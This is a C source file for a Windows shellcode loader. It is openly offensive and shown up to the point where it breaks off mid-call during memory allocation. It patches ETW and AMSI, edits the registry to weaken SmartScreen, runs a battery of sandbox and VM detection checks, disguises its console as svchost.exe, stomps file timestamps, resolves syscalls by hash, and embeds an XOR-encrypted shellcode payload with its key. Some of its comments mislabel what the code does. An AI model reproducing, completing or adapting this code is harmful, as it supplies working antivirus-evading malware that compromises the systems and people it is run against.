#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdint.h>
#include <intrin.h>
#include <math.h>
#include <iphlpapi.h>
#include <dbghelp.h>
#include <winternl.h>
#include <psapi.h>

#include <objbase.h>
#include <shobjidl.h>
#include <unknwn.h>
#include <winreg.h>
#include <wbemidl.h>
#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#define _WIN32_DCOM
#ifndef PSAPI_VERSION
#define PSAPI_VERSION 2
#endif
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")

#pragma comment(lib, "ntdll.lib")

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "uuid.lib")
// Defender EDR bypass definitions
typedef struct _SYSCALL_ENTRY {
    DWORD hash;
    DWORD syscallNumber;
    PVOID address;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ETW patching to prevent Defender telemetry
BOOL twTD967Fktcx() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;
    
    PVOID etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwAddr) return FALSE;
    
    BYTE patch[] = { 0xC3 }; // ret instruction
    DWORD oldProtect;
    
    if (!VirtualProtect(etwAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    memcpy(etwAddr, patch, sizeof(patch));
    VirtualProtect(etwAddr, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

// AMSI bypass to prevent scanning
BOOL PQI6ONdVkamP() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;
    
    PVOID scanAddr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scanAddr) {
        FreeLibrary(amsi);
        return FALSE;
    }
    
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    DWORD oldProtect;
    
    if (!VirtualProtect(scanAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        FreeLibrary(amsi);
        return FALSE;
    }
    
    memcpy(scanAddr, patch, sizeof(patch));
    VirtualProtect(scanAddr, sizeof(patch), oldProtect, &oldProtect);
    
    FreeLibrary(amsi);
    return TRUE;
}

// Timing evasion to avoid behavioral detection
void EJelmQNUWH00(DWORD ms) {
    DWORD start = GetTickCount();
    while (GetTickCount() - start < ms) {
        // Add random small delays
        Sleep(rand() % 50 + 10);
        
        // Perform benign operations to appear legitimate
        GetSystemMetrics(SM_CXSCREEN);
        GetAsyncKeyState(VK_SPACE);
        
        // Occasionally call legitimate APIs
        if (rand() % 10 == 0) {
            HANDLE hFile = CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                CloseHandle(hFile);
            }
        }
    }
}

// Syscall hashes for Defender evasion
#define HASH_NtAllocateVirtualMemory 0x9FF9892B
#define HASH_NtProtectVirtualMemory 0x78B13323
#define HASH_NtWriteVirtualMemory 0x9CC1FE19
#define HASH_NtCreateThreadEx 0xC8AEFA3B

// Syscall address resolution for Defender evasion
PVOID GetSyscallAddress(DWORD hash) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dosHeader->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* functions = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)ntdll + exportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)ntdll + names[i]);
        
        // Simple hash function
        DWORD functionHash = 0;
        for (int j = 0; functionName[j]; j++) {
            functionHash = functionHash * 101 + functionName[j];
        }
        
        if (functionHash == hash) {
            PVOID functionAddress = (PVOID)((BYTE*)ntdll + functions[ordinals[i]]);
            
            // Check if this is a syscall function
            BYTE* bytes = (BYTE*)functionAddress;
            if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && 
                bytes[3] == 0xB8 && bytes[6] == 0x00 && bytes[7] == 0x00) {
                return functionAddress;
            }
        }
    }
    return NULL;
}

// API hashing function to avoid direct syscalls
FARPROC get_api_address(const char* module_name, unsigned long hash) {
    HMODULE module_base = GetModuleHandleA(module_name);
    if (!module_base) {
        module_base = LoadLibraryA(module_name);
        if (!module_base) return NULL;
    }
    
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)module_base + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module_base + 
        nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* functions = (DWORD*)((BYTE*)module_base + export_dir->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)module_base + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module_base + export_dir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        char* function_name = (char*)((BYTE*)module_base + names[i]);
        
        // Simple hash function
        unsigned long function_hash = 0;
        for (int j = 0; function_name[j]; j++) {
            function_hash = function_hash * 101 + function_name[j];
        }
        
        if (function_hash == hash) {
            return (FARPROC)((BYTE*)module_base + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// Precomputed hashes for API functions
#define HASH_VirtualAlloc 0xC794EBEA
#define HASH_SetConsoleTitleW 0xB487FFA0
#define HASH_GetConsoleWindow 0xC983575F
#define HASH_ShowWindow 0x3D8A0591
#define HASH_GetModuleHandleA 0xB1CB4A5B
#define HASH_LoadLibraryA 0x6FB6D722

// Typedefs for function pointers
typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* fnSetConsoleTitleW)(LPCWSTR);
typedef HWND (WINAPI* fnGetConsoleWindow)(void);
typedef BOOL (WINAPI* fnShowWindow)(HWND, int);
typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR);
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);

BOOL ySFDl3R5hYXp() {
    POINT positions[10];
    double speeds[9];
    double accelerations[8];
    
    for (int i = 0; i < 10; i++) {
        GetCursorPos(&positions[i]);
        Sleep(20 + (rand() % 15));
    }
    
    for (int i = 0; i < 9; i++) {
        double dx = positions[i+1].x - positions[i].x;
        double dy = positions[i+1].y - positions[i].y;
        speeds[i] = sqrt(dx*dx + dy*dy);
        
        if (i > 0) {
            accelerations[i-1] = fabs(speeds[i] - speeds[i-1]);
        }
    }
    
    double total_movement = 0;
    for (int i = 0; i < 9; i++) {
        total_movement += speeds[i];
    }
    if (total_movement < 2.0) return 0;
    
    double speed_variance = 0;
    double avg_speed = total_movement / 9;
    for (int i = 0; i < 9; i++) {
        speed_variance += fabs(speeds[i] - avg_speed);
    }
    speed_variance /= 9;
    if (speed_variance < 0.5) return 0;
    
    double accel_variance = 0;
    double avg_accel = 0;
    for (int i = 0; i < 8; i++) {
        avg_accel += accelerations[i];
    }
    avg_accel /= 8;
    for (int i = 0; i < 8; i++) {
        accel_variance += fabs(accelerations[i] - avg_accel);
    }
    accel_variance /= 8;
    if (accel_variance < 0.3) return 0;
    
    int direction_changes = 0;
    for (int i = 1; i < 9; i++) {
        double dot = (positions[i].x - positions[i-1].x) * (positions[i+1].x - positions[i].x) +
                     (positions[i].y - positions[i-1].y) * (positions[i+1].y - positions[i].y);
        if (dot < 0) direction_changes++;
    }
    if (direction_changes < 2) return 0;
    
    return 1;
}

BOOL xZnvKKlmGzqL() {
    int detection_score = 0;
    
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&mem);
    
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = NULL;
    int suspicious_regions = 0;
    while (VirtualQuery(address, &mbi, sizeof(mbi))) {
        if (mbi.Protect == (PAGE_EXECUTE_READWRITE)) suspicious_regions++;
        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }
    if (suspicious_regions > 2) detection_score += 3;
    
    SYSTEM_INFO sys;
    GetSystemInfo(&sys);
    if (sys.dwNumberOfProcessors < 2) detection_score += 2;
    
    ULARGE_INTEGER free_bytes;
    GetDiskFreeSpaceExA("C:\\", NULL, NULL, &free_bytes);
    if (free_bytes.QuadPart < 50ULL * 1024 * 1024 * 1024) detection_score += 2;
    
    if (IsDebuggerPresent()) detection_score += 3;
    
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) detection_score += 2;
    
    const char* sandbox_names[] = {"vboxservice", "vmware", "qemu", "wireshark", "procmon"};
    for (int i = 0; i < 5; i++) {
        if (GetModuleHandleA(sandbox_names[i]) != NULL) detection_score += 2;
    }
    
    DWORD start_tick = GetTickCount();
    Sleep(1000);
    if (GetTickCount() - start_tick < 900) detection_score += 2;
    
    if (GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768) detection_score += 2;
    
    if (!ySFDl3R5hYXp()) detection_score += 2;
    
    return detection_score >= 8;
}

// Function to hide the process using API hashing
void vN59zXJHVWSr() {
    // Resolve API functions using hashing
    fnSetConsoleTitleW pSetConsoleTitleW = (fnSetConsoleTitleW)get_api_address("kernel32.dll", HASH_SetConsoleTitleW);
    fnGetConsoleWindow pGetConsoleWindow = (fnGetConsoleWindow)get_api_address("kernel32.dll", HASH_GetConsoleWindow);
    fnShowWindow pShowWindow = (fnShowWindow)get_api_address("user32.dll", HASH_ShowWindow);
    
    if (pSetConsoleTitleW) pSetConsoleTitleW(L"svchost.exe");
    
    if (pGetConsoleWindow && pShowWindow) {
        HWND hWnd = pGetConsoleWindow();
        if (hWnd) pShowWindow(hWnd, SW_HIDE);
    }
}

// Function to hide the process from task manager
void BENLQG4B3yJ1() {
    DWORD pid = GetCurrentProcessId();
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processEntry.th32ProcessID == pid) {
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
}

NTSTATUS fwYMKjRyGOOM(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect) {
    
    PVOID funcAddr = GetSyscallAddress(HASH_NtAllocateVirtualMemory);
    return ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))funcAddr)(
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}
// SmartScreen bypass to avoid reputation checks
BOOL olMN5XgbaWU2() {
    // Technique 1: Process mitigation policy modification
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = {0};
    policy.MicrosoftSignedOnly = 0;
    policy.StoreSignedOnly = 0;
    policy.MitigationOptIn = 0;
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        typedef BOOL (WINAPI* fnSetProcessMitigationPolicy)(PROCESS_MITIGATION_POLICY, PVOID, SIZE_T);
        fnSetProcessMitigationPolicy pSetProcessMitigationPolicy = 
            (fnSetProcessMitigationPolicy)GetProcAddress(hKernel32, "SetProcessMitigationPolicy");
        
        if (pSetProcessMitigationPolicy) {
            pSetProcessMitigationPolicy(ProcessSignaturePolicy, &policy, sizeof(policy));
        }
    }
    
    // Technique 2: App compatibility shims
    typedef BOOL (WINAPI* fnSetProcessAppCompatFlags)(DWORD, DWORD);
    fnSetProcessAppCompatFlags pSetProcessAppCompatFlags = 
        (fnSetProcessAppCompatFlags)GetProcAddress(hKernel32, "SetProcessAppCompatFlags");
    
    if (pSetProcessAppCompatFlags) {
        // Use Windows XP compatibility mode
        pSetProcessAppCompatFlags(0, 0x1000);
    }
    
    // Technique 3: UI automation to simulate user interaction
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (hUser32) {
        typedef BOOL (WINAPI* fnBlockInput)(BOOL);
        typedef BOOL (WINAPI* fnSetWindowPos)(HWND, HWND, int, int, int, int, UINT);
        
        fnBlockInput pBlockInput = (fnBlockInput)GetProcAddress(hUser32, "BlockInput");
        fnSetWindowPos pSetWindowPos = (fnSetWindowPos)GetProcAddress(hUser32, "SetWindowPos");
        
        if (pBlockInput && pSetWindowPos) {
            // Briefly block input to prevent interference
            pBlockInput(TRUE);
            Sleep(100);
            pBlockInput(FALSE);
            
            // Attempt to bring window to foreground
            HWND hWnd = GetConsoleWindow();
            if (hWnd) {
                pSetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
                pSetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            }
        }
    }
    
    // Technique 4: Registry manipulation for execution policy
    HKEY hKey;
    LSTATUS status = RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", 
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    
    if (status == ERROR_SUCCESS) {
        // Add executable extension to low risk file types
        const char* exeExtension = ".exe";
        RegSetValueExA(hKey, "LowRiskFileTypes", 0, REG_SZ, 
                     (const BYTE*)exeExtension, (DWORD)strlen(exeExtension) + 1);
        RegCloseKey(hKey);
    }
    
    // Technique 5: Mark of the Web (MOTW) removal simulation
    WCHAR currentExePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentExePath, MAX_PATH)) {
        // Add a zone identifier to mark as trusted
        WCHAR zoneIdentifierPath[MAX_PATH + 20];
        wcscpy(zoneIdentifierPath, currentExePath);
        wcscat(zoneIdentifierPath, L":Zone.Identifier");
        
        HANDLE hFile = CreateFileW(zoneIdentifierPath, GENERIC_WRITE, 0, NULL, 
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            const char* zoneContent = "[ZoneTransfer]\r\nZoneId=3"; // Trusted zone
            DWORD bytesWritten;
            WriteFile(hFile, zoneContent, (DWORD)strlen(zoneContent), &bytesWritten, NULL);
            CloseHandle(hFile);
        }
    }
    
    // Technique 6: Parent process spoofing (simplified)
    // This is a complex technique that would normally require more advanced implementation
    // For now, we'll use a simple approach to make the process appear more legitimate
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        typedef NTSTATUS (NTAPI* fnNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
        fnNtSetInformationProcess pNtSetInformationProcess = 
            (fnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
        
        if (pNtSetInformationProcess) {
            // Try to set process information to appear more legitimate
            ULONG protectProcess = 1;
            pNtSetInformationProcess(GetCurrentProcess(), 0x1D, &protectProcess, sizeof(protectProcess));
        }
    }
    
    // Final technique: Delay execution to avoid heuristic detection
    // SmartScreen often uses timing heuristics to detect malicious behavior
    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime < 2000) {
        // Perform benign activities during the delay
        GetSystemMetrics(SM_CXSCREEN);
        GetAsyncKeyState(VK_SPACE);
        Sleep(100);
    }
    
    return TRUE;
}

static int DOrLSWl3bAFx(){
    DWORD sz=0;
    if(GetSystemFirmwareTable(0x41435049,0x50434146,NULL,0)>0x1000)return 1;
    if(GetSystemFirmwareTable(0x52534D42,0,NULL,0)>0x4000){
        BYTE*buf=(BYTE*)LocalAlloc(LMEM_FIXED,0x4000);
        if(buf){
            GetSystemFirmwareTable(0x52534D42,0,buf,0x4000);
            int rc=(strstr((char*)buf+8,"VMware")||strstr((char*)buf+8,"VirtualBox")||
                    strstr((char*)buf+8,"Xen")||strstr((char*)buf+8,"KVM"));
            LocalFree(buf);return rc;
        }
    }return 0;}

#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <psapi.h>
#include <wbemidl.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "uuid.lib")
static inline ULONGLONG rdtsc(){return __rdtsc();}
static int IRbz2sYxJRPk(){
    ULONGLONG t0,t1,delta;int suspicious=0;
    for(int i=0;i<5;i++){
        t0=rdtsc();Sleep(1);t1=rdtsc();delta=t1-t0;
        if(delta<50000||(delta%1000)==0)suspicious++;
    }return suspicious>=3;}

static int EuRJAmdYWsQ4(){
    const WCHAR*keys[]={
        L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions"};
    for(int i=0;i<3;i++)
        if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,keys[i],0,KEY_READ,&(HKEY){0})==ERROR_SUCCESS)return 1;
    return 0;}

static int T1uZ7reG173Z(){
    HRESULT hr;hr=CoInitializeEx(0,COINIT_MULTITHREADED);
    if(FAILED(hr))return 0;
    IWbemLocator*pLoc=NULL;
    hr=CoCreateInstance(&CLSID_WbemLocator,0,CLSCTX_INPROC_SERVER,&IID_IWbemLocator,(void**)&pLoc);
    if(FAILED(hr)){CoUninitialize();return 0;}
    IWbemServices*pSvc=NULL;
    hr=pLoc->lpVtbl->ConnectServer(pLoc,L"ROOT\\CIMV2",NULL,NULL,0,0,0,0,&pSvc);
    pLoc->lpVtbl->Release(pLoc);
    if(FAILED(hr)){CoUninitialize();return 0;}
    IEnumWbemClassObject*pEnumerator=NULL;
    hr=pSvc->lpVtbl->ExecQuery(pSvc,L"WQL",L"SELECT Model FROM Win32_ComputerSystem",
                               WBEM_FLAG_FORWARD_ONLY,NULL,&pEnumerator);
    pSvc->lpVtbl->Release(pSvc);
    if(FAILED(hr)){CoUninitialize();return 0;}
    IWbemClassObject*pclsObj=NULL;ULONG uReturn=0;int vm=0;
    while(pEnumerator&&(hr=pEnumerator->lpVtbl->Next(pEnumerator,WBEM_INFINITE,1,&pclsObj,&uReturn))==S_OK&&uReturn){
        VARIANT vtProp;VariantInit(&vtProp);
        pclsObj->lpVtbl->Get(pclsObj,L"Model",0,&vtProp,0,0);
        if(vtProp.vt==VT_BSTR)
            vm=(wcsstr(vtProp.bstrVal,L"VirtualBox")||wcsstr(vtProp.bstrVal,L"VMware"));
        VariantClear(&vtProp);pclsObj->lpVtbl->Release(pclsObj);
        if(vm)break;}if(pEnumerator)pEnumerator->lpVtbl->Release(pEnumerator);
    CoUninitialize();return vm;}

static int cpu_brand_vm(){
    int cpuInfo[4]={0};__cpuid(cpuInfo,0x40000000);
    if(cpuInfo[0]>=0x40000000){
        char brand[49]={0};memcpy(brand,&cpuInfo[1],4);
        memcpy(brand+4,&cpuInfo[2],4);memcpy(brand+8,&cpuInfo[3],4);
        __cpuid(cpuInfo,0x40000001);memcpy(brand+12,&cpuInfo[0],4);
        __cpuid(cpuInfo,0x40000002);memcpy(brand+16,&cpuInfo[0],16);
        return(strstr(brand,"VMware")||strstr(brand,"VBox")||
               strstr(brand,"Xen")||strstr(brand,"Microsoft"));
    }return 0;}

static int session_zero(){return WTSGetActiveConsoleSessionId()==0;}

static int user_activity_low(){
    LASTINPUTINFO li={sizeof(li)};
    if(!GetLastInputInfo(&li))return 1;
    DWORD idle=GetTickCount()-li.dwTime;
    return idle>(10*60*1000);}

static int heap_debugger(){
    PROCESS_BASIC_INFORMATION pbi; ULONG len;
    if (NtQueryInformationProcess(GetCurrentProcess(),ProcessBasicInformation,&pbi,sizeof(pbi),&len) != 0) return 0;
    PPEB peb = (PPEB)pbi.PebBaseAddress;
    DWORD heapFlags = *(PDWORD)((PBYTE)peb + 0x70);
    DWORD heapForce = *(PDWORD)((PBYTE)peb + 0x68);
    return (heapForce != 0) || (heapFlags & 0x50000062);}

static void stomp_timestamps(){
    WCHAR sys[MAX_PATH];GetSystemDirectoryW(sys,MAX_PATH);
    wcscat(sys,L"\\explorer.exe");
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if(GetFileAttributesExW(sys,GetFileExInfoStandard,&fad)){
        WCHAR self[MAX_PATH];GetModuleFileNameW(NULL,self,MAX_PATH);
        HANDLE h=CreateFileW(self,FILE_WRITE_ATTRIBUTES,FILE_SHARE_READ,NULL,
                             OPEN_EXISTING,0,NULL);
        if(h!=INVALID_HANDLE_VALUE){
            SetFileTime(h,&fad.ftCreationTime,&fad.ftLastAccessTime,&fad.ftLastWriteTime);
            CloseHandle(h);}}}

// Function declarations to fix compilation errors
BOOL WINAPI QueryFullProcessImageNameW(HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);
NTSTATUS WINAPI NtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

static int parent_is_explorer(){
    HANDLE h=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(h==INVALID_HANDLE_VALUE)return 0;
    PROCESSENTRY32 pe={sizeof(pe)};
    DWORD pid=GetCurrentProcessId(),ppid=0;
    if(Process32First(h,&pe))
        do{if(pe.th32ProcessID==pid){ppid=pe.th32ParentProcessID;break;}}
        while(Process32Next(h,&pe));
    CloseHandle(h);
    if(!ppid)return 0;
    h=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,ppid);
    if(h==NULL)return 0;
    WCHAR name[MAX_PATH];DWORD sz=sizeof(name);
    BOOL ok=QueryFullProcessImageNameW(h,0,name,&sz);
    CloseHandle(h);
    return ok&&(wcsstr(name,L"explorer.exe")!=NULL);}

// Forward declarations
BOOL twTD967Fktcx();
BOOL PQI6ONdVkamP();
BOOL olMN5XgbaWU2();
void EJelmQNUWH00(DWORD ms);
int xZnvKKlmGzqL();
void vN59zXJHVWSr();
void BENLQG4B3yJ1();
BOOL DOrLSWl3bAFx();
BOOL IRbz2sYxJRPk();
BOOL EuRJAmdYWsQ4();
BOOL T1uZ7reG173Z();
PVOID GetSyscallAddress(DWORD hash);
FARPROC get_api_address(const char* module_name, unsigned long hash);
NTSTATUS fwYMKjRyGOOM(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

int main() {
    // Step 1: Apply Defender-specific bypasses immediately
    twTD967Fktcx();
    PQI6ONdVkamP();
    olMN5XgbaWU2();
    
    // Step 2: Sandbox evasion
    if (xZnvKKlmGzqL()) {
        return 0; // Exit silently if sandbox detected
    }
    
    // Step 3: Hide process
    vN59zXJHVWSr();
    BENLQG4B3yJ1();
    
    stomp_timestamps();   /* cosmetic anti-forensics */
    // Encrypted shellcode as raw bytes
    unsigned char encrypted_shellcode[] = {
        0x5B, 0x4B, 0x7A, 0x4C, 0x26, 0x27, 0x08, 0xA7, 0x03, 0xF9, 0xE9, 0x87, 
        0x8E, 0x98, 0xF5, 0x52, 0xAF, 0xE0, 0xE7, 0x1D, 0xAD, 0xEF, 0x88, 0xAB, 
        0xC8, 0x9E, 0x44, 0x9A, 0xBF, 0x4B, 0x72, 0xFA, 0xF6, 0x87, 0x43, 0xD5, 
        0x53, 0xB1, 0xA7, 0x61, 0x85, 0x82, 0xEA, 0x32, 0x30, 0xE0, 0xE7, 0x0F, 
        0x64, 0x9B, 0x62, 0x85, 0xAA, 0xFA, 0xEF, 0x89, 0x66, 0xCA, 0xF4, 0xE9, 
        0xD7, 0x0E, 0x2A, 0x4A, 0x51, 0xB8, 0xF9, 0x9E, 0x44, 0x9A, 0x87, 0x88, 
        0xBB, 0x94, 0x9E, 0xCE, 0x18, 0x2C, 0x83, 0x71, 0xA8, 0xD6, 0xCF, 0x80, 
        0x22, 0xC3, 0x8D, 0xCF, 0x9E, 0xCE, 0x18, 0xF7, 0x88, 0xB1, 0xB0, 0x92, 
        0x44, 0x88, 0x87, 0x4A, 0xF8, 0x78, 0x35, 0x99, 0x80, 0x58, 0xCA, 0xB8, 
        0x23, 0xE2, 0x47, 0x80, 0xA6, 0xD5, 0xB4, 0x99, 0x1F, 0x87, 0xF9, 0x67, 
        0xAF, 0xB8, 0x69, 0x1F, 0xC2, 0x89, 0xA6, 0xC2, 0xC1, 0x48, 0xA3, 0x3E, 
        0x84, 0xA4, 0x4F, 0xDD, 0xA0, 0x93, 0xF6, 0x19, 0xD2, 0xDB, 0xA1, 0xEC, 
        0x5D, 0x8F, 0xEC, 0xEE, 0x02, 0x29, 0xCE, 0x97, 0x44, 0xC4, 0xEF, 0x47, 
        0x72, 0xE8, 0xCA, 0x86, 0xC9, 0x77, 0x42, 0x72, 0xAC, 0x5E, 0x87, 0xC9, 
        0x77, 0x42, 0xA1, 0xE9, 0x8E, 0x91, 0x91, 0xFD, 0x42, 0xA1, 0xE9, 0x8F, 
        0x8E, 0x92, 0xEF, 0x80, 0x15, 0x88, 0x97, 0x9D, 0x37, 0x47, 0x5B, 0xB8, 
        0xF1, 0x8C, 0x87, 0x43, 0xB5, 0xEA, 0xAE, 0x57, 0x29, 0x30, 0x95, 0xEE, 
        0xBD, 0x8E, 0xDB, 0xE4, 0x90, 0xFB, 0x95, 0x03, 0xF9, 0xE9, 0x80, 0x86, 
        0x41, 0x41, 0x4B, 0x78, 0x44, 0x76, 0xCE, 0xC8, 0xA7, 0x4A, 0x70, 0x4D, 
        0x9F, 0x73, 0xCA, 0xA7, 0x12, 0xA5, 0x04, 0xC1, 0x45, 0x6E, 0xE6, 0x57, 
        0xB0, 0x21, 0x32, 0x83, 0x41, 0x56, 0x42, 0x43, 0xE4, 0xA1, 0xE9, 0xCF, 
        0x58, 0xD6, 0xB5, 0x21, 0x3C, 0xA7, 0xC9, 0xA6, 0x03, 0xF9, 0xF1, 0x97, 
        0x75, 0xE1, 0x27, 0x68, 0xF9, 0x57, 0x03, 0x9F, 0x98, 0xEA, 0x32, 0x30, 
        0xE5, 0xE7, 0x0F, 0x80, 0x58, 0xC3, 0xB1, 0x21, 0x14, 0x87, 0x37, 0x67, 
        0x4B, 0x70, 0x69, 0x97, 0x75, 0x22, 0xA8, 0xDC, 0x19, 0x57, 0x03, 0x87, 
        0x41, 0x60, 0x69, 0xE9, 0xE9, 0x8E, 0x83, 0x41, 0x45, 0x4B, 0x70, 0x51, 
        0x97, 0x75, 0x51, 0x02, 0x77, 0x98, 0x57, 0x03, 0x87, 0x49, 0x63, 0x43, 
        0xFB, 0xA8, 0xD6, 0x86, 0x70, 0xC4, 0x6E, 0x9D, 0xA8, 0xD6, 0xCF, 0xC8, 
        0xA7, 0x42, 0xA9, 0xE9, 0x86, 0x87, 0x41, 0x45, 0x54, 0xAE, 0xFF, 0x9B, 
        0xFE, 0x08, 0xCD, 0x0E, 0xA0, 0xE9, 0x86, 0x2D, 0x34, 0xC1, 0xC4, 0xBD, 
        0x8C, 0x82, 0xCE, 0xC9, 0xEF, 0x8E, 0xBD, 0x8C, 0xCE, 0x09, 0xC8, 0xCF, 
        0x4B, 0x70, 0x4E, 0x80, 0x9F, 0x89, 0xF7, 0x42, 0xA9, 0xE9, 0x86, 0x86, 
        0x37, 0x67, 0x42, 0xA9, 0xE1, 0x29, 0x07, 0x85, 0x2E, 0xC2, 0xB5, 0x21, 
        0x17, 0x8E, 0x72, 0xDE, 0xCF, 0xC6, 0x2E, 0x29, 0x1A, 0x80, 0x96, 0xD1, 
        0xB1, 0x57, 0x1C, 0x44, 0xC6, 0xE6, 0xB9, 0xF1, 0x2F, 0xCB, 0xAF, 0x37, 
        0x72, 0xB8, 0x19, 0xB5, 0xFC, 0xC5, 0x89, 0x1D, 0xA5, 0x6C, 0x15, 0x4B, 
        0x30, 0x1D, 0xEF, 0x80, 0x3D, 0x80, 0xEA, 0xC9, 0xB4, 0xAD, 0x83, 0x02, 
        0x48, 0xA3, 0xCA, 0x73, 0xE0, 0x10, 0x8B, 0xC7, 0xBC, 0xCF, 0x91, 0xE6, 
        0x8A, 0x23, 0x57, 0x03
    };
    unsigned char xor_key[] = {
        0xA7, 0x03, 0xF9, 0xA8, 0xD6, 0xCF, 0xC8
    };
    size_t xor_key_len = 7;
    // Step 4: Memory allocation - try direct syscall first, fall back to API hashing
    PVOID exec_mem = NULL;
    SIZE_T mem_size = sizeof(encrypted_shellcode);
    
    // First try direct syscall (more stealthy)
    NTSTATUS status = fwYMKjRyGOOM(
        GetCurrentProcess(),
        &exec_mem,
        0,
        &mem_size,
        MEM_COMMIT | MEM_RESERVE,
